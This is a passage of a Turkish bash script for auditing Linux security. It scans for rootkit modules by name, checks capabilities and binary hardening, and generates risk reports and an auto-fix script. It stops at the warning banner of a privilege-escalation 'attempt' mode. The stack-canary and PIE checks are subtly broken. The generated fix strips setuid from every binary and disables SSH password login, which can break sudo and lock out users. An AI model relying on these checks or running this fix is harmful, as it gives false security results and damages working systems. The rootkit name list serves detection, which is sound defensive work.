            echo "=== SISTEM BAŞLANGIÇ ANLAMSALI ==="
            echo "Tarih: $(date)"
            echo "=== DOSYA HASH'LERİ ==="
            find /usr/bin /usr/sbin /bin /sbin -type f 2>/dev/null | head -20 | xargs md5sum 2>/dev/null
        } > "$baseline_file" 2>/dev/null
        echo -e "\e[00;32m  ✓ Baseline: $baseline_file\e[00m"
    fi
}

kernel_modules_audit() {
    echo -e "\e[00;31m[-] Kernel Modülleri ve Rootkit Tespiti:\e[00m"
    
    echo -e "\e[00;33m   → Yüklü kernel modülleri:\e[00m"
    lsmod | wc -l
    echo "   Toplam: $(lsmod | wc -l) modül yüklü"
    
    echo -e "\e[00;33m   → Şüpheli modülü adları (rootkit olabilir):\e[00m"
    local suspicious_mods=0
    for mod in $(lsmod | awk '{print $1}' | tail -n +2); do
        if [[ "$mod" =~ ^(diamorphine|suterusu|enyelkm|reptile|kdmflush)$ ]]; then
            echo -e "\e[00;31m   [!] ROOTKIT TESPİTİ: $mod\e[00m"
            critical_count=$((critical_count + 1))
            risk_score=$((risk_score + 30))
            log_finding "KRİTİK" "Rootkit modülü tespit edildi: $mod"
            suspicious_mods=$((suspicious_mods + 1))
        fi
    done
    
    if [ $suspicious_mods -eq 0 ]; then
        echo -e "\e[00;32m   ✓ Bilinen rootkit modülleri bulunmadı\e[00m"
    fi
    
    echo -e "\e[00;33m   → Modül yükleme koruması:\e[00m"
    if [ -f /proc/sys/kernel/modules_disabled ]; then
        disabled=$(cat /proc/sys/kernel/modules_disabled)
        if [ "$disabled" = "0" ]; then
            echo -e "\e[00;31m   [!] Kernel modülü yükleme devre dışı değil\e[00m"
            risk_score=$((risk_score + 8))
            medium_count=$((medium_count + 1))
        else
            echo -e "\e[00;32m   ✓ Kernel modülü yükleme devre dışı\e[00m"
        fi
    fi
}

scheduled_tasks_deep_audit() {
    echo -e "\e[00;31m[-] Zamanlanmış Görevler DERİN Analizi:\e[00m"
    
    echo -e "\e[00;33m   → AT komutları (cron'dan daha tehlikeli):\e[00m"
    if command_exists atq; then
        atq 2>/dev/null || echo "   → AT görevleri yok"
        if atq 2>/dev/null | grep -q .; then
            risk_score=$((risk_score + 5))
            log_finding "BİLGİ" "AT komutu ile zamanlanmış görevler bulundu"
        fi
    fi
    
    echo -e "\e[00;33m   → Systemd timer'ları:\e[00m"
    if command_exists systemctl; then
        systemctl list-timers 2>/dev/null | head -10
        systemctl list-timers --all 2>/dev/null | grep -c "timer" > /dev/null
        if systemctl list-timers --all 2>/dev/null | grep -q "root"; then
            echo -e "\e[00;33m   → Root tarafından çalışan timer'lar var\e[00m"
        fi
    fi
    
    echo -e "\e[00;33m   → Cron dosyalarını okuyabilir kullanıcılar:\e[00m"
    for cron_file in /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/*; do
        if [ -f "$cron_file" ] && [ -r "$cron_file" ]; then
            perms=$(ls -l "$cron_file" | awk '{print $1}')
            echo -e "   → $cron_file ($perms)"
            if [[ "$perms" == *"r--r--r--"* ]]; then
                log_finding "ORTA" "Cron dosyası dünya tarafından okunabilir: $cron_file"
                medium_count=$((medium_count + 1))
                risk_score=$((risk_score + 5))
            fi
        fi
    done
}

capabilities_audit() {
    echo -e "\e[00;31m[-] Linux Capability Analizi (Privilege Boundaries):\e[00m"
    
    if ! command_exists getcap; then
        echo -e "\e[00;32m   ✓ getcap yüklü değil (tehlikeli değilse iyi)\e[00m"
        return
    fi
    
    echo -e "\e[00;33m   → Özel capability'ler ile binary'ler:\e[00m"
    local cap_count=0
    for binary in $(find /usr/bin /usr/sbin /bin /sbin -type f 2>/dev/null); do
        caps=$(getcap "$binary" 2>/dev/null)
        if [ -n "$caps" ] && [ "$caps" != "$binary =" ]; then
            echo -e "   → $binary: $(echo $caps | awk '{print $NF}')"
            cap_count=$((cap_count + 1))
            
            # Tehlikeli capability'ler
            if echo "$caps" | grep -qE "(cap_setuid|cap_setgid|cap_sys_admin|cap_sys_ptrace)"; then
                echo -e "\e[00;31m   [!] Tehlikeli capability: $binary\e[00m"
                risk_score=$((risk_score + 10))
                high_count=$((high_count + 1))
                log_finding "YÜKSEK" "Tehlikeli capability tespit edildi: $binary"
            fi
        fi
    done
    
    if [ $cap_count -eq 0 ]; then
        echo -e "\e[00;32m   ✓ Özel capability'ler yok\e[00m"
    else
        echo -e "\e[00;33m   → Toplam: $cap_count binary'de capability tanımlanmış\e[00m"
    fi
}

binary_hardening_audit() {
    echo -e "\e[00;31m[-] Binary Hardening Analizi (Exploit Mitigations):\e[00m"
    
    if ! command_exists readelf; then
        echo -e "\e[00;32m   ✓ readelf yüklü değil, hardening kontrolü yapılamıyor\e[00m"
        return
    fi
    
    echo -e "\e[00;33m   → Sistem binary'lerinin sertleştirilme durumu:\e[00m"
    
    local hardenings=("PIE" "RELRO" "Stack Canary" "Fortify")
    local important_bins=("/bin/bash" "/usr/bin/sudo" "/bin/su" "/sbin/init")
    
    for binary in "${important_bins[@]}"; do
        if [ -f "$binary" ]; then
            echo -e "\e[00;33m   → Kontrol: $binary\e[00m"
            
            if readelf -l "$binary" 2>/dev/null | grep -q "STACK"; then
                echo -e "   ✓ Stack canary desteği"
            else
                echo -e "\e[00;31m   [!] Stack canary desteği yok\e[00m"
                medium_count=$((medium_count + 1))
                risk_score=$((risk_score + 3))
            fi
            
            if readelf -h "$binary" 2>/dev/null | grep -q "PIE"; then
                echo -e "   ✓ PIE (Position Independent Executable)"
            else
                echo -e "\e[00;33m   → PIE yok (ASLR etkili olmaz)\e[00m"
            fi
        fi
    done
}

auditd_readiness() {
    echo -e "\e[00;31m[-] Audit Sistemi Hazırlığı (auditd):\e[00m"
    
    if ! command_exists auditctl; then
        echo -e "\e[00;31m   [!] auditd sistemi yüklü değil\e[00m"
        risk_score=$((risk_score + 5))
        medium_count=$((medium_count + 1))
        log_finding "ORTA" "Audit sistemi (auditd) yüklü değil"
        return
    fi
    
    echo -e "\e[00;33m   → Audit daemon durumu:\e[00m"
    if systemctl is-active --quiet auditd 2>/dev/null; then
        echo -e "\e[00;32m   ✓ auditd çalışıyor\e[00m"
    else
        echo -e "\e[00;31m   [!] auditd çalışmıyor\e[00m"
        risk_score=$((risk_score + 5))
    fi
    
    echo -e "\e[00;33m   → Audit kuralları:\e[00m"
    local rule_count=$(auditctl -l 2>/dev/null | grep -cv "^No rules")
    echo "   → $rule_count audit kuralı tanımlanmış"
    
    if [ "$rule_count" -eq 0 ]; then
        echo -e "\e[00;33m   → Varsayılan audit kuralları yok\e[00m"
    fi
    
    echo -e "\e[00;33m   → İzlenen dizinler:\e[00m"
    auditctl -l 2>/dev/null | grep "watch=" | head -5
}

password_policy_advanced() {
    echo -e "\e[00;31m[-] UYGULANMIŞ Parola Politikası (Advacned):\e[00m"
    
    echo -e "\e[00;33m   → PAM password quality modülü:\e[00m"
    if [ -f /etc/security/pwquality.conf ]; then
        echo -e "\e[00;32m   ✓ pwquality yapılandırması bulundu\e[00m"
        grep -v "^#" /etc/security/pwquality.conf | head -10
    else
        echo -e "\e[00;31m   [!] pwquality yapılandırması bulunamadı\e[00m"
        risk_score=$((risk_score + 10))
        medium_count=$((medium_count + 1))
        log_finding "ORTA" "Parola kalitesi kontrolleri yapılandırılmamış"
    fi
    
    echo -e "\e[00;33m   → Parola yaşı kontrolleri:\e[00m"
    grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_MIN_LEN" /etc/login.defs 2>/dev/null || echo "   → Standart dışı ayarlar"
    
    echo -e "\e[00;33m   → Şifre geçmişi kontrolleri:\e[00m"
    if grep -q "remember=" /etc/pam.d/* 2>/dev/null; then
        echo -e "\e[00;32m   ✓ Parola geçmişi kontrol edildiğine göre\e[00m"
        grep "remember=" /etc/pam.d/* 2>/dev/null
    else
        echo -e "\e[00;33m   → Parola geçmişi koruması etkin değil\e[00m"
    fi
    
    echo -e "\e[00;33m   → Başarısız giriş denemesi kilidi:\e[00m"
    if grep -q "pam_faillock" /etc/pam.d/* 2>/dev/null; then
        echo -e "\e[00;32m   ✓ faillock modülü etkin\e[00m"
        grep "pam_faillock" /etc/pam.d/* 2>/dev/null | head -3
    else
        echo -e "\e[00;33m   → faillock devre dışı (sözlük saldırısına açık)\e[00m"
        medium_count=$((medium_count + 1))
        risk_score=$((risk_score + 5))
    fi
}

umask_default_permissions() {
    echo -e "\e[00;31m[-] UMASK ve Varsayılan İzinler Denetimi:\e[00m"
    
    echo -e "\e[00;33m   → Sistem UMASK değeri:\e[00m"
    current_umask=$(umask)
    echo "   → UMASK: $current_umask"
    
    if [ "$current_umask" != "0077" ] && [ "$current_umask" != "0077" ]; then
        echo -e "\e[00;33m   → UMASK çok izin verici (önerilan: 0077)\e[00m"
        medium_count=$((medium_count + 1))
        risk_score=$((risk_score + 3))
    fi
    
    echo -e "\e[00;33m   → /etc/profile ve login.defs UMASK ayarları:\e[00m"
    grep -E "^[ \t]*umask" /etc/login.defs /etc/profile /etc/bash.bashrc 2>/dev/null || echo "   → UMASK yapılandırması açık değil"
    
    echo -e "\e[00;33m   → Yeni dosyaların varsayılan grup yazma izni:\e[00m"
    if find /home -type f -perm -g+w 2>/dev/null | head -1 | grep -q .; then
        echo -e "\e[00;31m   [!] Dosyalar grup tarafından yazılabilir\e[00m"
        medium_count=$((medium_count + 1))
    fi
}

# Gelişmiş Raporlama ve Öneri Sistemi
advanced_reporting() {
echo -e "\e[00;33m### GELİŞMİŞ RAPORLAMA VE ÖNERİ SİSTEMİ ########\e[00m"

# Risk seviyesi hesaplama ve yüzde hesabı
# Risk skorunu 100 ile sınırla
if [ "$risk_score" -gt 100 ]; then
    risk_score=100
fi

risk_percentage=$risk_score  # 0-100 arası
if [ "$risk_score" -gt 80 ]; then
    risk_level="KRİTİK"
    risk_color="\e[00;31m"
    urgency="ACİL MÜDAHALE GEREKLİ"
    risk_icon=""
elif [ "$risk_score" -gt 60 ]; then
    risk_level="ÇOK YÜKSEK"
    risk_color="\e[00;31m"
    urgency="HIZLICA DÜZELTİLMELİ"
    risk_icon=""
elif [ "$risk_score" -gt 40 ]; then
    risk_level="YÜKSEK"
    risk_color="\e[00;33m"
    urgency="KISA SÜREDE DÜZELTİLMELİ"
    risk_icon=""
elif [ "$risk_score" -gt 20 ]; then
    risk_level="ORTA"
    risk_color="\e[00;35m"
    urgency="DÜZELTİLMELİ"
    risk_icon=""
else
    risk_level="DÜŞÜK"
    risk_color="\e[00;32m"
    urgency="GÖZDEN GEÇİRİLMELİ"
    risk_icon=""
fi

echo -e "\n$risk_color================================================${NC}"
echo -e "$risk_color              GELİŞMİŞ GÜVENLİK RAPORU              ${NC}"
echo -e "$risk_color================================================${NC}"
echo ""

echo -e "\e[00;31mRISK ANALIZI:${NC}"
echo -e "${risk_color}Genel Risk Skoru: $risk_score/100 (%$risk_percentage)${NC}"
echo -e "${risk_color}Risk Seviyesi: $risk_icon $risk_level${NC}"
echo -e "${risk_color}Öncelik: $urgency${NC}"
log_finding "ÖZET" "Genel Risk Skoru: $risk_score/100 (%$risk_percentage)"
log_finding "ÖZET" "Risk Seviyesi: $risk_level"
log_finding "ÖZET" "Öncelik: $urgency"
echo ""

echo -e "\e[00;31mBULGU ISTANISTIKLERI:${NC}"
echo -e "\e[00;31mKRİTİK Bulgular: $critical_count${NC}"
echo -e "\e[00;33mYÜKSEK Riskli: $high_count${NC}"
echo -e "\e[00;35mORTA Riskli: $medium_count${NC}"
echo -e "\e[00;32mDÜŞÜK Riskli: $low_count${NC}"
log_finding "ÖZET" "KRİTİK: $critical_count | YÜKSEK: $high_count | ORTA: $medium_count | DÜŞÜK: $low_count"
echo ""

smart_posture_advisor

local total_findings=$((critical_count + high_count + medium_count + low_count))
if [ "$total_findings" -gt 0 ]; then
    # Risk seviyesine göre detaylı öneriler
    echo -e "\e[00;31mRISK SEVİYESİNE GÖRE ÖNERİLER:${NC}"

    case "$risk_level" in
    "KRİTİK")
        echo -e "\e[00;31mKRITIK RISK ONCELIKLERI (Hemen Yapin):${NC}"
        echo -e "   • Root yetkisi gerektiren SUID/SGID dosyalarını kaldırın veya düzeltin"
        echo -e "   • /etc/shadow ve /root/.ssh erişim izinlerini sıkılaştırın"
        echo -e "   • Herkes tarafından yazılabilir dosyaları hemen düzeltin"
        echo -e "   • Container kaçış yollarını kapatın (Docker/Kubernetes)"
        echo -e "   • Sistem yöneticisi ile acil toplantı düzenleyin"
        echo -e "   • Güvenlik olayını rapor edin ve logları inceleyin"
        ;;
    "ÇOK YÜKSEK")
        echo -e "\e[00;31mCOK YUKSEK RISK ONCELIKLERI (24 Saat Icinde):${NC}"
        echo -e "   • Açık portları ve servisleri gözden geçirin"
        echo -e "   • Sudo yapılandırmasını güçlendirin"
        echo -e "   • Parola politikalarını zorunlu hale getirin"
        echo -e "   • Güvenlik duvarı kurallarını güncelleyin"
        echo -e "   • Cron job'larını ve zamanlanmış görevleri kontrol edin"
        ;;
    "YÜKSEK")
        echo -e "\e[00;33mYUKSEK RISK ONCELIKLERI (1 Hafta Icinde):${NC}"
        echo -e "   • Yazılabilir dosya izinlerini düzeltin"
        echo -e "   • Kullanıcı hesaplarını gözden geçirin"
        echo -e "   • Servis konfigürasyonlarını optimize edin"
        echo -e "   • Loglama sistemini geliştirin"
        echo -e "   • Yedekleme prosedürlerini test edin"
        ;;
    "ORTA")
        echo -e "\e[00;35mORTA RISK ONCELIKLERI (1 Ay Icinde):${NC}"
        echo -e "   • Sistem güncellemelerini planlayın"
        echo -e "   • Güvenlik politikalarını gözden geçirin"
        echo -e "   • Kullanıcı eğitim programları düzenleyin"
        echo -e "   • Monitoring araçlarını değerlendirin"
        echo -e "   • Güvenlik denetimlerini planlayın"
        ;;
    "DÜŞÜK")
        echo -e "\e[00;32mDUSUK RISK ONCELIKLERI (Duzenli Bakim):${NC}"
        echo -e "   • Düzenli güvenlik taramaları yapın"
        echo -e "   • Sistem güncellemelerini takip edin"
        echo -e "   • Güvenlik eğitimlerini sürdürün"
        echo -e "   • Yedekleme testlerini yapın"
        echo -e "   • Güvenlik politikalarını güncelleyin"
        ;;
esac
fi

echo ""
echo -e "\e[00;31mTEKNİK DÜZELTME ADIMLARI:${NC}"

# Kritik riskler için spesifik komutlar
if [ "$critical_count" -gt 0 ]; then
    echo -e "\e[00;31mKRİTİK DÜZELTMELER:${NC}"
    echo -e "   # SUID/SGID dosyalarını kontrol edin:"
    echo -e "   find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -la {} \; 2>/dev/null"
    echo -e "   # Herkes tarafından yazılabilir dosyaları düzeltin:"
    echo -e "   find / -type f -perm -002 -exec chmod o-w {} \; 2>/dev/null"
    echo -e "   # Shadow dosya izinlerini kontrol edin:"
    echo -e "   ls -la /etc/shadow"
fi

# Yüksek riskler için
if [ "$high_count" -gt 0 ]; then
    echo -e "\e[00;33mYÜKSEK RİSK DÜZELTMELERİ:${NC}"
    echo -e "   # Açık portları kontrol edin:"
    echo -e "   netstat -tulnp | grep LISTEN"
    echo -e "   # Sudo yapılandırmasını kontrol edin:"
    echo -e "   visudo -c"
    echo -e "   # Güvenlik duvarını etkinleştirin:"
    echo -e "   ufw enable  # veya firewalld, iptables"
fi

# Genel öneriler
echo -e "\e[00;31mGENEL GUZENLIK ONERILERI:${NC}"
echo -e "   1. Sistemi güncel tutun: apt update && apt upgrade"
echo -e "   2. Minimum prensibi uygulayın - gereksiz servisleri kapatın"
echo -e "   3. Güçlü parola politikaları: passwd -l <kullanici>"
echo -e "   4. Çok faktörlü kimlik doğrulama kullanın"
echo -e "   5. Loglama ve monitoring: journalctl, rsyslog"
echo -e "   6. Düzenli yedekleme yapın"
echo -e "   7. Ağ segmentasyonu uygulayın"
echo -e "   8. Güvenlik duvarı kurun: ufw, firewalld"
echo -e "   9. IDS/IPS sistemi değerlendirin"
echo -e "   10. Personel güvenlik eğitimi verin"

echo -e "\e[00;31mONERILEN KAYNAKLAR:${NC}"
echo -e "   • OWASP Top 10: https://owasp.org/www-project-top-ten/"
echo -e "   • CIS Benchmarks: https://www.cisecurity.org/"
echo -e "   • NIST Cybersecurity Framework"
echo -e "   • Linux Security Hardening Guides"
echo -e "   • Container Security Best Practices"

echo -e "\e[00;33mSONUC VE ONERILER:${NC}"
case "$risk_level" in
    "KRİTİK")
        echo -e "   KRITIK DURUM: Sistem ciddi guvenlik riski altinda! Acil mudahale sart."
        echo -e "   Derhal uzman yardım alın ve sistemi izole edin."
        ;;
    "ÇOK YÜKSEK")
        echo -e "   COK YUKSEK RISK: Sistem guvenligi zayif. Hizlica duzeltmeler yapin."
        echo -e "   Güvenlik uzmanı desteği alın."
        ;;
    "YÜKSEK")
        echo -e "   YUKSEK RISK: Onemli guvenlik aciklari var. Kisa surede duzeltin."
        echo -e "   Sistem güvenliğini güçlendirin."
        ;;
    "ORTA")
        echo -e "   ORTA RISK: Bazi iyilestirmeler gerekli. Duzenli bakim yapin."
        echo -e "   Güvenlik politikalarını gözden geçirin."
        ;;
    "DÜŞÜK")
        echo -e "   DUSUK RISK: Sistem genel olarak guvenli. Duzenli kontroller yapin."
        echo -e "   Güvenlik standartlarını koruyun."
        ;;
esac

if [ "$medium_count" -gt 0 ]; then
    echo -e "   • Orta riskli noktaları ele alın: yapılandırma dosyası izinleri, export edilmiş kimlik bilgileri, backup dosyaları."
fi
if [ "$low_count" -gt 0 ]; then
    echo -e "   • Düşük riskli bulguları kayıt altına alıp düzenli taramaları tekrarlayın."
fi

# Rapor dosyasını ekrana yazdır
if [ -f "$REPORT_FILE" ]; then
    echo ""
    echo -e "\e[00;36m═══════════════════════════════════════════════════════════════════════════════${NC}"
    echo -e "\e[00;36m RAPOR DOSYASI İÇERİĞİ ($REPORT_FILE)                    ${NC}"
    echo -e "\e[00;36m═══════════════════════════════════════════════════════════════════════════════${NC}"
    cat "$REPORT_FILE"
    echo -e "\e[00;36m═══════════════════════════════════════════════════════════════════════════════${NC}"
    echo -e "\e[00;32mRapor dosyası başarıyla ekrana yazdırıldı.${NC}"
else
    echo -e "\e[00;31mUyarı: Rapor dosyası bulunamadı: $REPORT_FILE${NC}"
fi
}

# Otomatik düzeltme script'i oluştur
generate_fix_script() {
    local fix_script="${SCRIPT_DIR}/auto_fix_$(date +%Y%m%d_%H%M%S).sh"
    
    echo -e "\e[00;33m### OTOMATİK DÜZELTME SCRIPT'İ ###############\e[00m"
    echo -e "${CYAN}Düzeltme script'i oluşturuluyor: $fix_script${NC}"
    
    cat > "$fix_script" << 'EOF'
#!/bin/bash
# Otomatik Güvenlik Düzeltme Script'i
# Bu script risk analizine göre otomatik düzeltmeler uygular

echo "OTOMATIK GUZENLIK DUZELTMELERI BASLATILIYOR..."
echo "BU SCRIPT SISTEMDE DEGISTIKLIK YAPACAK!"
echo "Yedekleme yapildigindan emin olun!"
read -p "Devam etmek istiyor musunuz? (yes/no): " confirm

if [[ "$confirm" != "yes" ]]; then
    echo "Islem iptal edildi"
    exit 1
fi

echo "Duzeltmeler baslatiliyor..."

EOF

    # Kritik düzeltmeler
    if [ "$critical_count" -gt 0 ]; then
        cat >> "$fix_script" << 'EOF'
echo "KRITIK DUZELTMELER UYGULANIYOR..."

# SUID/SGID dosyalarını güvenli hale getir
echo "SUID/SGID dosyaları kontrol ediliyor..."
find / -type f \( -perm -4000 -o -perm -2000 \) -exec chmod a-s {} \; 2>/dev/null

# Herkes tarafından yazılabilir dosyaları düzelt
echo "Herkes tarafından yazılabilir dosyalar düzeltiliyor..."
find / -type f -perm -002 -exec chmod o-w {} \; 2>/dev/null

# Shadow dosya izinlerini kontrol et
if [ -f /etc/shadow ]; then
    chmod 600 /etc/shadow
    chown root:shadow /etc/shadow 2>/dev/null || chown root:root /etc/shadow
fi

EOF
    fi

    # Yüksek risk düzeltmeleri
    if [ "$high_count" -gt 0 ]; then
        cat >> "$fix_script" << 'EOF'
echo "YUKSEK RISK DUZELTMELERİ UYGULANIYOR..."

# Güvenlik duvarını etkinleştir
if command -v ufw >/dev/null 2>&1; then
    echo "UFW güvenlik duvarı etkinleştiriliyor..."
    ufw --force enable
elif command -v firewall-cmd >/dev/null 2>&1; then
    echo "Firewalld güvenlik duvarı etkinleştiriliyor..."
    firewall-cmd --set-default-zone=drop
fi

# SSH yapılandırmasını güçlendir
if [ -f /etc/ssh/sshd_config ]; then
    echo "SSH yapılandırması güçlendiriliyor..."
    sed -i 's/#PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
    sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
    sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
    systemctl restart sshd 2>/dev/null || service ssh restart 2>/dev/null
fi

EOF
    fi

    # Genel düzeltmeler
    cat >> "$fix_script" << 'EOF'
echo "GENEL GUZENLIK IYILESTIRMELERI..."

# Sistem güncellemelerini kontrol et
echo "Sistem güncellemeleri kontrol ediliyor..."
if command -v apt >/dev/null 2>&1; then
    apt update && apt upgrade -y
elif command -v yum >/dev/null 2>&1; then
    yum update -y
elif command -v dnf >/dev/null 2>&1; then
    dnf upgrade -y
fi

# Logrotate yapılandırması
if [ -f /etc/logrotate.conf ]; then
    echo "Logrotate yapılandırması kontrol ediliyor..."
    sed -i 's/weekly/daily/' /etc/logrotate.conf
    sed -i 's/rotate 4/rotate 12/' /etc/logrotate.conf
fi

# Sysctl güvenlik ayarları
echo "Sysctl güvenlik ayarları uygulanıyor..."
cat >> /etc/sysctl.conf << EOF
# Güvenlik iyileştirmeleri
net.ipv4.ip_forward = 0
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.default.accept_redirects = 0
net.ipv4.conf.all.secure_redirects = 0
net.ipv4.conf.default.secure_redirects = 0
EOF
sysctl -p >/dev/null 2>&1

echo "OTOMATIK DUZELTMELER TAMAMLANDI!"
echo "Sistemi yeniden baslatmaniz onerilir"
echo "Guvenlik durumunuzu tekrar tarayin"

EOF

    chmod +x "$fix_script"
    echo -e "${GREEN}[+] Otomatik düzeltme script'i oluşturuldu: $fix_script${NC}"
    echo -e "${YELLOW}[!] Bu script'i çalıştırmadan önce yedek alın!${NC}"
}

# HTML rapor oluştur
generate_html_report() {
    local html_file="${SCRIPT_DIR}/security_report_$(date +%Y%m%d_%H%M%S).html"
    
    echo -e "\e[00;33m### HTML RAPOR OLUŞTURULUYOR ###############\e[00m"
    echo -e "${CYAN}HTML rapor oluşturuluyor: $html_file${NC}"
    
    cat > "$html_file" << EOF
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Linux Güvenlik Tarama Raporu</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; border-radius: 10px; text-align: center; }
        .risk-card { background: white; margin: 20px 0; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .critical { border-left: 5px solid #e74c3c; }
        .high { border-left: 5px solid #f39c12; }
        .medium { border-left: 5px solid #3498db; }
        .low { border-left: 5px solid #27ae60; }
        .metric { display: inline-block; margin: 10px; padding: 10px; background: #ecf0f1; border-radius: 5px; }
        .progress-bar { width: 100%; height: 20px; background: #ecf0f1; border-radius: 10px; overflow: hidden; }
        .progress-fill { height: 100%; transition: width 0.3s ease; }
        .recommendations { background: #fff3cd; padding: 15px; border-radius: 5px; margin: 10px 0; }
        .code { background: #2c3e50; color: #ecf0f1; padding: 10px; border-radius: 5px; font-family: monospace; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background-color: #f8f9fa; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Linux Guvenlik Tarama Raporu</h1>
        <p>Oluşturulma Tarihi: $(date '+%Y-%m-%d %H:%M:%S')</p>
        <p>Hostname: $(hostname)</p>
        <p>Script Versiyonu: $version</p>
    </div>

    <div class="risk-card critical">
        <h2>Risk Analizi Ozeti</h2>
        <div class="metric">Toplam Risk Skoru: <strong>$risk_score/100 ($risk_percentage%)</strong></div>
        <div class="metric">Risk Seviyesi: <strong>$risk_level</strong></div>
        <div class="metric">Tarama Süresi: <strong>$(( $(date +%s) - SCAN_START_TIME )) saniye</strong></div>
        
        <h3>Risk Dağılımı</h3>
        <div class="progress-bar">
            <div class="progress-fill" style="width: $risk_percentage%; background: ${risk_color//#/};"></div>
        </div>
        
        <table>
            <tr><th>Bulgu Türü</th><th>Adet</th><th>Risk Puanı</th></tr>
            <tr><td>Kritik</td><td>$critical_count</td><td>$((critical_count * 25))</td></tr>
            <tr><td>Yüksek</td><td>$high_count</td><td>$((high_count * 15))</td></tr>
            <tr><td>Orta</td><td>$medium_count</td><td>$((medium_count * 5))</td></tr>
            <tr><td>Düşük</td><td>$low_count</td><td>$((low_count * 1))</td></tr>
        </table>
    </div>

    <div class="risk-card">
        <h2>Onerilen Aksiyonlar</h2>
EOF

    # Risk seviyesine göre öneriler
    case "$risk_level" in
        "KRİTİK")
            cat >> "$html_file" << EOF
        <div class="recommendations">
            <h3>KRITIK ONCELIKLER (Hemen Yapin)</h3>
            <ul>
                <li>Derhal yetki yükseltme zafiyetlerini düzeltin</li>
                <li>Container kaçış yollarını kapatın</li>
                <li>Hassas dosya erişimlerini kısıtlayın</li>
                <li>Sistem yöneticisi ile acil toplantı düzenleyin</li>
            </ul>
        </div>
EOF
            ;;
        "ÇOK YÜKSEK")
            cat >> "$html_file" << EOF
        <div class="recommendations">
            <h3>COK YUKSEK ONCELIKLER (24 Saat Icinde)</h3>
            <ul>
                <li>Açık portları ve servisleri gözden geçirin</li>
                <li>Sudo yapılandırmasını güçlendirin</li>
                <li>Parola politikalarını zorunlu hale getirin</li>
                <li>Güvenlik duvarı kurallarını güncelleyin</li>
            </ul>
        </div>
EOF
            ;;
        "YÜKSEK")
            cat >> "$html_file" << EOF
        <div class="recommendations">
            <h3>YUKSEK ONCELIKLER (1 Hafta Icinde)</h3>
            <ul>
                <li>Yazılabilir dosya izinlerini düzeltin</li>
                <li>Kullanıcı hesaplarını gözden geçirin</li>
                <li>Servis konfigürasyonlarını optimize edin</li>
                <li>Loglama sistemini geliştirin</li>
            </ul>
        </div>
EOF
            ;;
        "ORTA")
            cat >> "$html_file" << EOF
        <div class="recommendations">
            <h3>ORTA ONCELIKLER (1 Ay Icinde)</h3>
            <ul>
                <li>Sistem güncellemelerini planlayın</li>
                <li>Güvenlik politikalarını gözden geçirin</li>
                <li>Kullanıcı eğitim programları düzenleyin</li>
                <li>Monitoring araçlarını değerlendirin</li>
            </ul>
        </div>
EOF
            ;;
        "DÜŞÜK")
            cat >> "$html_file" << EOF
        <div class="recommendations">
            <h3>DUSUK ONCELIKLER (Duzenli Bakim)</h3>
            <ul>
                <li>Düzenli güvenlik taramaları yapın</li>
                <li>Sistem güncellemelerini takip edin</li>
                <li>Güvenlik eğitimlerini sürdürün</li>
                <li>Yedekleme testlerini yapın</li>
            </ul>
        </div>
EOF
            ;;
    esac

    cat >> "$html_file" << EOF
    </div>

    <div class="risk-card">
        <h2>Teknik Duzeltme Komutlari</h2>
        <div class="code">
EOF

    # Teknik komutlar
    if [ "$critical_count" -gt 0 ]; then
        cat >> "$html_file" << EOF
# KRİTİK DÜZELTMELER<br>
find / -type f \( -perm -4000 -o -perm -2000 \) -exec chmod a-s {} \;<br>
find / -type f -perm -002 -exec chmod o-w {} \;<br>
chmod 600 /etc/shadow<br><br>
EOF
    fi

    if [ "$high_count" -gt 0 ]; then
        cat >> "$html_file" << EOF
# YÜKSEK RİSK DÜZELTMELERİ<br>
ufw --force enable<br>
sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config<br>
systemctl restart sshd<br><br>
EOF
    fi

    cat >> "$html_file" << EOF
# GENEL GÜVENLİK<br>
apt update && apt upgrade -y<br>
sed -i 's/weekly/daily/' /etc/logrotate.conf<br>
        </div>
    </div>

    <div class="risk-card">
        <h2>Kaynaklar</h2>
        <ul>
            <li><a href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a></li>
            <li><a href="https://www.cisecurity.org/">CIS Benchmarks</a></li>
            <li><a href="https://csrc.nist.gov/">NIST Cybersecurity Framework</a></li>
        </ul>
    </div>

    <div class="footer" style="text-align: center; margin-top: 20px; color: #666;">
        <p>Rapor oluşturulma tarihi: $(date)</p>
        <p>Linux Yetki Yükseltme Script'i v$version</p>
    </div>
</body>
</html>
EOF

    echo -e "${GREEN}[+] HTML rapor oluşturuldu: $html_file${NC}"
}

# TEHLIKELI: Yetki Yükseltme Deneme Fonksiyonu
# BU FONKSİYON ÇOK TEHLİKELİDİR - SADECE EĞİTİM AMAÇLI
privilege_escalation_attempt() {
    echo -e "\e[00;33m### YETKI YÜKSELTME DENEME MODU ###############\e[00m"
    
    # Çok fazla uyarı
    echo -e "\e[00;31m╔══════════════════════════════════════════════════════════════╗\e[00m"
    echo -e "\e[00;31m║                    KRITIK UYARI                     ║\e[00m"
    echo -e "\e[00;31m╠══════════════════════════════════════════════════════════════╣\e[00m"
    echo -e "\e[00;31m║  BU MOD YETKİ YÜKSELTME EXPLOIT'LERİ ÇALIŞTIRIR!           ║\e[00m"
    echo -e "\e[00;31m║  SİSTEMİ HASAR GÖREBİLİR, VERİ KAYBI OLABİLİR!             ║\e[00m"
    echo -e "\e[00;31m║  SADECE KENDİ SİSTEMİNİZDE VE EĞİTİM AMAÇLI KULLANIN!      ║\e[00m"
    echo -e "\e[00;31m║  YASAL SORUMLULUK SİZE AİTTİR!                             ║\e[00m"
